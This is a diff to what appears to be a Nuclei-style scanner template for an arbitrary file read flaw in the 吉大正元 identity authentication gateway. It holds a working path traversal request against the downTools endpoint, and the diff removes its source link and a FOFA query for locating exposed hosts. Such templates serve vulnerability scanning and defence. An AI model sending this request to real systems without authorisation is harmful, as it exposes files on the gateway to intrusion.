@@ -3,17 +3,11 @@ info:
   name: 吉大正元身份认证网关 downtools 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ueaqg003ua7hgzz9'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ueaqg003ua7hgzz9
-    fofa: title="吉大正元身份认证网关"
 http:
 - raw:
-  - 'GET /jit_pnx_portal/downTools?fileName=../../../../../../../../../home/gateway/config/version.txt HTTP/1.1
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730351462231-bc7523e1-5277-4a3f-b6bf-80c442a6ebb5.png)'
+  - GET /jit_pnx_portal/downTools?fileName=../../../../../../../../../home/gateway/config/version.txt HTTP/1.1
   redirects: false
   matchers:
   - status:
